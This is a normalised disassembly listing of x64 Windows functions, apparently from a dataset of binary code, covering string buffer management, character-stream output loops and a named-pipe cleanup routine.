mov rax [ rcx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
test rdi rdi
jne r-xdata
mov rdx rdi
call sub_1400061b0
test rdi rdi
je r-xdata
mov rcx [ rbx + 0x10 ]
cmp rsi 0x1
jne r-xdata
mov [ rcx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rax rcx
mov [ rcx ] 0x0
jmp r-xdata
mov rax [ rcx ]
mov [ rax ] dil
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx + rcx ] bpl
jmp r-xdata
mov rax [ rbx ]
mov [ rax + rcx ] bpl
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
movsx edx bpl
add rcx rax
mov r8 rsi
call sub_14003d760
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_14000a800
push rbx
push rbp
push rsi
push rdi
sub rsp 0x38
mov rbx [ rsp + 0x80 ]
mov rdi r9
mov rsi r8
mov rbp rdx
test rbx rbx
je r-xdata
mov rax [ rsi ]
mov [ rbp ] rax
mov rax [ rsi + 0x8 ]
mov [ rbp + 0x8 ] rax
mov rax rbp
add rsp 0x38
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov [ rsp + 0x60 ] r12
mov [ rsp + 0x78 ] r13
mov [ rsp + 0x30 ] r14
xor r14d r14d
lea r12 [ rcx + 0x10 ]
mov r13d 0xffff
nop
mov [ rsi ] 0x1
mov rax [ rcx + 0x48 ]
movzx r8d [ rsp + 0x68 ]
cmp [ rax ] r14
je r-xdata
movzx eax [ rdi ]
lea r9 [ rsp + 0x70 ]
lea rdx [ rsp + 0x80 ]
lea rcx [ rsp + 0x68 ]
mov r8d 0x1
mov [ rsp + 0x68 ] r14w
mov [ rsp + 0x80 ] al
mov [ rsp + 0x70 ] r14d
mov [ rsp + 0x20 ] r12
call sub_1400385a4
mov rcx [ rsi + 0x8 ]
test rcx rcx
je r-xdata
mov r14 [ rsp + 0x30 ]
mov r13 [ rsp + 0x78 ]
mov r12 [ rsp + 0x60 ]
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] r14d
jle r-xdata
inc rdi
dec rbx
jne r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
cmp r13w r8w
jne r-xdata
sub_14000a900
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x78
movzx r15d [ rsp + 0xe8 ]
mov r13 [ rsp + 0xe0 ]
movaps [ rsp + 0x60 ] xmm6
mov r12 r9
mov rdi r8
mov r14 rcx
nop
mov rbp r13
sub rbp r12
jmp r-xdata
mov rdi [ rsp + 0xd0 ]
add r12 rbp
sub r13 rbp
movups [ rdi ] xmm6
je r-xdata
add r14 0x10
mov r15d 0xffff
xor r13d r13d
nop [ rax + rax ] ax
movups xmm6 [ rdi ]
mov rsi r12
mov rdi rbp
movaps [ rsp + 0x40 ] xmm6
mov rbx [ rsp + 0x48 ]
test rbp rbp
je r-xdata
mov rax [ rsp + 0xc8 ]
movups [ rax ] xmm6
movaps xmm6 [ rsp + 0x60 ]
add rsp 0x78
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
test r15w r15w
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
movzx r8d [ rsp + 0x30 ]
cmp [ rax ] r13
je r-xdata
inc r12
dec r13
mov [ rsp + 0xe0 ] r13
jmp r-xdata
movaps [ rsp + 0x50 ] xmm6
test rbx rbx
je r-xdata
movzx eax [ rsi ]
lea r9 [ rsp + 0x34 ]
lea rdx [ rsp + 0xd8 ]
lea rcx [ rsp + 0x30 ]
mov r8d 0x1
mov [ rsp + 0x30 ] r13w
mov [ rsp + 0xd8 ] al
mov [ rsp + 0x34 ] r13d
mov [ rsp + 0x20 ] r14
call sub_1400385a4
test rbx rbx
je r-xdata
mov r13 [ rsp + 0xe0 ]
movzx r15d [ rsp + 0xe8 ]
movaps xmm6 [ rsp + 0x40 ]
mov r14 [ rsp + 0xc0 ]
mov rax [ rbx ]
movzx edx r8w
mov rcx rbx
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rbx + 0x60 ]
cmp [ rax ] r13d
jle r-xdata
mov r8 r13
xor edx edx
mov rcx r12
call sub_14003b840
mov rbp rax
test rax rax
je r-xdata
mov [ rsp + 0x50 ] 0x1
movaps xmm6 [ rsp + 0x50 ]
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
inc rsi
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
mov rax [ rbx ]
movzx edx r15w
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
cmp r15w r8w
jne r-xdata
movups [ rdi ] xmm6
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r15w
movzx eax r15w
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_14000aaf0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push r12
sub rsp 0x20
mov rax [ rdx + 0x10 ]
mov rbp r9
mov r12 r8
mov rsi rdx
mov rbx rcx
cmp rax r8
jae r-xdata
sub rax r8
mov r8 [ rcx + 0x10 ]
cmp rax r9
cmovb rbp rax
or rax 0xffffffffffffffff
sub rax r8
cmp rax rbp
ja r-xdata
lea rcx [ r--data ]
call sub_140037948
mov [ rsp + 0x30 ] rdi
test rbp rbp
je r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
lea rdi [ r8 + rbp ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov rax [ rcx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
test rdi rdi
jne r-xdata
mov rdx rdi
call sub_1400061b0
test rdi rdi
je r-xdata
cmp [ rsi + 0x18 ] 0x10
jb r-xdata
mov [ rcx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rsi [ rsi ]
mov rax rcx
mov [ rcx ] 0x0
jmp r-xdata
mov rax [ rcx ]
mov [ rax ] dil
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
add rcx [ rbx + 0x10 ]
lea rdx [ rsi + r12 ]
mov r8 rbp
call sub_14003a8c0
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_14000ac10
mov [ rsp + 0x8 ] rcx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov [ rsp + 0x88 ] rsi
mov r15 rdx
mov rsi rcx
xor ebx ebx
mov [ rsp + 0x80 ] ebx
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r13 [ rcx - 0x1 ]
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov rdi [ rcx + rsi + 0x28 ]
test rdi rdi
jle r-xdata
xor edi edi
cmp rdi r13
jle r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rsi + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
sub rdi r13
jmp r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rsi + 0x10 ] 0x0
sete al
mov [ rsp + 0x30 ] al
test al al
jne r-xdata
mov rcx [ rcx + rsi + 0x50 ]
test rcx rcx
je r-xdata
mov r14 rsi
mov [ rsp + 0x28 ] rsi
mov rcx [ rcx + rsi + 0x48 ]
test rcx rcx
je r-xdata
mov eax [ rcx + rsi + 0x18 ]
and eax 0x1c0
mov r12d 0xffff
cmp eax 0x40
je r-xdata
mov ebx 0x4
jmp r-xdata
call sub_1400103c0
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx ]
mov r8 r13
mov rdx r15
call [ rax + 0x48 ]
cmp rax r13
je r-xdata
test rdi rdi
jle r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test ebx ebx
je r-xdata
test rdi rdi
jle r-xdata
mov ebx 0x4
jmp r-xdata
test ebx ebx
jne r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rsi + 0x58 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
call j_sub_14004042c
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov [ rcx + rsi + 0x28 ] 0x0
jmp r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rsi + 0x58 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x80 ] ebx
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax [ r14 ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + r14 + 0x48 ]
test rcx rcx
je r-xdata
mov rcx r14
call sub_1400112c0
nop
xor r8d r8d
call sub_140003120
nop
or edx 0x4
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
dec rdi
jmp r-xdata
or ebx 0x4
mov [ rsp + 0x80 ] ebx
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
mov rax rsi
mov rbx [ rsp + 0x78 ]
mov rsi [ rsp + 0x88 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
dec rdi
jmp r-xdata
or ebx 0x4
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
cmp r12w r8w
jne r-xdata
cmp r12w r8w
jne r-xdata
sub_14000ae70
mov rax rsp
mov [ rax + 0x8 ] rcx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rsi
mov r13 rdx
mov rsi rcx
xor ebx ebx
mov [ rsp + 0x78 ] ebx
mov r14 [ rdx + 0x10 ]
mov rax [ rcx ]
movsxd rcx [ rax + 0x4 ]
mov rdi [ rcx + rsi + 0x28 ]
test rdi rdi
jle r-xdata
xor edi edi
cmp rdi r14
jbe r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rsi + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
sub rdi r14
jmp r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rsi + 0x10 ] 0x0
sete al
mov [ rsp + 0x30 ] al
test al al
jne r-xdata
mov rcx [ rcx + rsi + 0x50 ]
test rcx rcx
je r-xdata
mov r15 rsi
mov [ rsp + 0x28 ] rsi
mov rcx [ rcx + rsi + 0x48 ]
test rcx rcx
je r-xdata
mov eax [ rcx + rsi + 0x18 ]
and eax 0x1c0
mov r12d 0xffff
cmp eax 0x40
je r-xdata
mov ebx 0x4
jmp r-xdata
call sub_1400103c0
cmp [ r13 + 0x18 ] 0x8
jb r-xdata
nop [ rax ] eax
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test ebx ebx
je r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx ]
mov r8 r14
mov rdx r13
call [ rax + 0x48 ]
cmp rax r14
je r-xdata
mov r13 [ r13 ]
test ebx ebx
jne r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rsi + 0x58 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
call j_sub_14004042c
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
test rdi rdi
je r-xdata
mov ebx 0x4
jmp r-xdata
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax [ r15 ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + r15 + 0x48 ]
test rcx rcx
je r-xdata
mov rcx r15
call sub_1400112c0
nop
xor r8d r8d
call sub_140003120
nop
or edx 0x4
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
mov [ rcx + rsi + 0x28 ] 0x0
jmp r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rsi + 0x58 ]
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x78 ] ebx
dec rdi
jmp r-xdata
or ebx 0x4
mov [ rsp + 0x78 ] ebx
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
mov rax rsi
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rdi rdi
je r-xdata
cmp r12w r8w
jne r-xdata
dec rdi
jmp r-xdata
or ebx 0x4
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
cmp r12w r8w
jne r-xdata
sub_14000b0c0
push rbp
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rbp rcx
xor edx edx
lea rcx [ rsp + 0x68 ]
call sub_14003825c
nop
mov rsi [ rw-data ]
mov [ rsp + 0x70 ] rsi
mov rdi [ rw-data ]
test rdi rdi
jne r-xdata
mov rcx [ rbp ]
cmp rdi [ rcx + 0x18 ]
jae r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
cmp [ rw-data ] rdi
jne r-xdata
xor ebx ebx
mov rax [ rcx + 0x10 ]
mov rbx [ rax + rdi * 8 ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x60 ]
call sub_14003828c
mov rdi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cdqe
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
call sub_140037e88
cmp rdi [ rax + 0x18 ]
jae r-xdata
lea rcx [ rsp + 0x68 ]
call sub_14003828c
mov rax rbx
mov rbx [ rsp + 0x78 ]
add rsp 0x40
pop rdi
pop rsi
pop rbp
retn
jmp r-xdata
test rsi rsi
je r-xdata
mov rax [ rax + 0x10 ]
mov rbx [ rax + rdi * 8 ]
cmp [ rcx + 0x24 ] 0x0
je r-xdata
mov rdx rbp
lea rcx [ rsp + 0x70 ]
call sub_14000b360
cmp rax 0xffffffffffffffff
jne r-xdata
mov rbx rsi
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003a7f8
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
int3
lea rcx [ rsp + 0x60 ]
call sub_14003828c
mov rcx rbx
call sub_140037db8
nop
inc rcx
mov [ rbx + 0x8 ] rcx
sub_14000b210
push rbp
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rbp rcx
xor edx edx
lea rcx [ rsp + 0x68 ]
call sub_14003825c
nop
mov rsi [ rw-data ]
mov [ rsp + 0x70 ] rsi
mov rdi [ rw-data ]
test rdi rdi
jne r-xdata
mov rcx [ rbp ]
cmp rdi [ rcx + 0x18 ]
jae r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
cmp [ rw-data ] rdi
jne r-xdata
xor ebx ebx
mov rax [ rcx + 0x10 ]
mov rbx [ rax + rdi * 8 ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x60 ]
call sub_14003828c
mov rdi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cdqe
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
call sub_140037e88
cmp rdi [ rax + 0x18 ]
jae r-xdata
lea rcx [ rsp + 0x68 ]
call sub_14003828c
mov rax rbx
mov rbx [ rsp + 0x78 ]
add rsp 0x40
pop rdi
pop rsi
pop rbp
retn
jmp r-xdata
test rsi rsi
je r-xdata
mov rax [ rax + 0x10 ]
mov rbx [ rax + rdi * 8 ]
cmp [ rcx + 0x24 ] 0x0
je r-xdata
mov rdx rbp
lea rcx [ rsp + 0x70 ]
call sub_14000b480
cmp rax 0xffffffffffffffff
jne r-xdata
mov rbx rsi
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_14003825c
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003a7f8
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
int3
lea rcx [ rsp + 0x60 ]
call sub_14003828c
mov rcx rbx
call sub_140037db8
nop
inc rcx
mov [ rbx + 0x8 ] rcx
sub_14000b360
mov rax rsp
push rsi
push rdi
push r12
sub rsp 0x70
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov rbp rdx
mov rsi rcx
xor r12d r12d
mov edi r12d
mov [ rsp + 0x90 ] r12d
cmp [ rcx ] rdi
jne r-xdata
mov eax 0x4
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
lea ecx [ r12 + 0x18 ]
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x90 ] rax
test rax rax
je r-xdata
mov rbx r12
mov rax [ rbp ]
mov rdx [ rax + 0x28 ]
test rdx rdx
jne r-xdata
lea rcx [ rsp + 0x28 ]
call sub_140037f70
nop
mov rcx [ rsp + 0x60 ]
test rcx rcx
je r-xdata
lea rcx [ rsp + 0x28 ]
call sub_140002990
mov edi 0x1
mov [ rbx + 0x8 ] r12
lea rax [ r--data ]
mov [ rbx ] rax
call sub_140037a98
mov [ rbx + 0x10 ] rax
jmp r-xdata
lea rdx [ rax + 0x30 ]
mov [ rsp + 0x60 ] r12
mov rcx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsi ] rbx
test dil 0x1
je r-xdata
mov [ rsp + 0x50 ] r12
mov rcx [ rsp + 0x40 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsp + 0x40 ] r12
mov rcx [ rsp + 0x30 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsp + 0x30 ] r12
lea rcx [ rsp + 0x28 ]
call sub_14003828c
call sub_14003ad04
sub_14000b480
mov rax rsp
push rsi
push rdi
push r12
sub rsp 0x70
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x20 ] rbp
mov rbp rdx
mov rsi rcx
xor r12d r12d
mov edi r12d
mov [ rax + 0x8 ] r12d
cmp [ rcx ] rdi
jne r-xdata
mov eax 0x4
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
lea ecx [ r12 + 0x30 ]
call sub_14003ac60
mov rbx rax
mov [ rsp + 0xa0 ] rax
test rax rax
je r-xdata
mov rbx r12
mov rax [ rbp ]
mov rdx [ rax + 0x28 ]
test rdx rdx
jne r-xdata
lea rcx [ rsp + 0x28 ]
call sub_140037f70
nop
mov rcx [ rsp + 0x60 ]
test rcx rcx
je r-xdata
lea rcx [ rsp + 0x28 ]
call sub_140002990
nop
mov edi 0x1
mov [ rsp + 0x90 ] edi
mov [ rbx + 0x8 ] r12
lea rax [ r--data ]
mov [ rbx ] rax
mov rcx rbx
call sub_14000b5a0
nop
jmp r-xdata
lea rdx [ rax + 0x30 ]
mov [ rsp + 0x60 ] r12
mov rcx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsi ] rbx
test dil 0x1
je r-xdata
mov [ rsp + 0x50 ] r12
mov rcx [ rsp + 0x40 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsp + 0x40 ] r12
mov rcx [ rsp + 0x30 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsp + 0x30 ] r12
lea rcx [ rsp + 0x28 ]
call sub_14003828c
call sub_14003ad04
sub_14000b5a0
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x48
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov rsi rcx
mov r14b 0x1
call sub_14003b85c
mov r12 rax
xor r13d r13d
mov [ rsi + 0x10 ] r13
mov [ rsi + 0x20 ] r13
mov [ rsi + 0x28 ] r13
lea rdi [ r--data ]
call sub_140037a98
mov ebx 0x1
mov ecx ebx
call j_sub_14003ac60
mov rdx rax
mov [ rsi + 0x10 ] rax
call sub_140037a98
mov [ rsp + 0x88 ] rax
lea rdx [ rsp + 0x88 ]
lea rcx [ r--data ]
call sub_140007870
mov [ rsi + 0x20 ] rax
call sub_140037a98
mov [ rsp + 0x88 ] rax
lea rdx [ rsp + 0x88 ]
lea rcx [ r--data ]
call sub_140007870
mov [ rsi + 0x28 ] rax
call sub_140037a98
mov [ rsp + 0x98 ] rax
mov rax [ r12 ]
movzx ecx [ rax ]
mov [ rsp + 0x80 ] cl
mov [ rsp + 0x88 ] r13w
mov [ rsp + 0x90 ] r13d
lea rax [ rsp + 0x98 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x90 ]
mov r8d 0x1
lea rdx [ rsp + 0x80 ]
lea rcx [ rsp + 0x88 ]
call sub_1400385a4
movzx eax [ rsp + 0x88 ]
mov [ rsi + 0x18 ] ax
call sub_140037a98
mov [ rsp + 0x98 ] rax
mov rax [ r12 + 0x8 ]
movzx ecx [ rax ]
mov [ rsp + 0x80 ] cl
mov [ rsp + 0x88 ] r13w
mov [ rsp + 0x90 ] r13d
lea rax [ rsp + 0x98 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x90 ]
mov r8d 0x1
lea rdx [ rsp + 0x80 ]
lea rcx [ rsp + 0x88 ]
call sub_1400385a4
movzx eax [ rsp + 0x88 ]
mov [ rsi + 0x1a ] ax
test r14b r14b
je r-xdata
movzx ecx [ rdi ]
mov [ rdx ] cl
dec rbx
inc rdx
inc rdi
jmp r-xdata
add rsp 0x48
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
call sub_140037a98
mov [ rsp + 0x98 ] rax
mov [ rsp + 0x80 ] 0x2e
mov [ rsp + 0x88 ] r13w
mov [ rsp + 0x90 ] r13d
lea rax [ rsp + 0x98 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x90 ]
mov r8d 0x1
lea rdx [ rsp + 0x80 ]
lea rcx [ rsp + 0x88 ]
call sub_1400385a4
movzx r11d [ rsp + 0x88 ]
mov [ rsi + 0x18 ] r11w
call sub_140037a98
mov [ rsp + 0x98 ] rax
mov [ rsp + 0x80 ] 0x2c
mov [ rsp + 0x88 ] r13w
mov [ rsp + 0x90 ] r13d
lea rax [ rsp + 0x98 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x90 ]
mov r8d 0x1
lea rdx [ rsp + 0x80 ]
lea rcx [ rsp + 0x88 ]
call sub_1400385a4
movzx r11d [ rsp + 0x88 ]
mov [ rsi + 0x1a ] r11w
test rbx rbx
je r-xdata
sub_14000b810
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x50
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
mov rdi r8
mov rsi rdx
mov rbp rcx
mov [ rsp + 0x20 ] rcx
mov [ rsp + 0x30 ] rdx
mov [ rsp + 0x38 ] r8
lea rax [ r--data ]
mov [ rcx ] rax
mov [ rcx + 0x8 ] 0xffffffffffffffff
mov [ rcx + 0x28 ] 0x7
xor r12d r12d
mov [ rcx + 0x20 ] r12
mov [ rcx + 0x10 ] r12w
lea r8d [ r12 + 0x2 ]
lea rdx [ r--data ]
add rcx 0x10
call sub_140001ea0
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
lea rcx [ rbp + 0x10 ]
call sub_140007240
lea r8d [ r12 + 0x6 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x10 ]
call sub_14000bb30
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rsi
lea rcx [ rbp + 0x10 ]
call sub_140007240
nop
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r12
mov [ rsi ] r12w
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsi ]
call j_sub_14003ad04
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r12
mov [ rdi ] r12w
mov rax rbp
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x50
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rdi ]
call j_sub_14003ad04
sub_14000b920
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov edi edx
mov [ rcx ] rax
mov rcx [ rcx + 0x8 ]
cmp rcx 0xffffffffffffffff
je r-xdata
cmp [ rbx + 0x28 ] 0x8
jb r-xdata
test rcx rcx
je r-xdata
xor eax eax
mov [ rbx + 0x28 ] 0x7
mov [ rbx + 0x20 ] rax
mov [ rbx + 0x10 ] ax
test dil 0x1
je r-xdata
mov rcx [ rbx + 0x10 ]
call j_sub_14003ad04
call [ FlushFileBuffers@IAT ]
mov rcx [ rbx + 0x8 ]
call [ DisconnectNamedPipe@IAT ]
mov rcx [ rbx + 0x8 ]
call [ CloseHandle@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_14003ad04
sub_14000b9a0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x150
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x140 ] rax
mov rsi [ rw-data ]
xor ebp ebp
cmp [ rcx + 0x18 ] 0x8
mov [ rcx + 0x10 ] rbp
mov rbx rcx
jb r-xdata
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
mov r8d [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
mov rcx rbx
shr r8 0x1
call sub_14000bb30
test dil dil
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
mov [ rax ] bp
nop [ rax + rax ] eax
mov rcx [ rsi + 0x8 ]
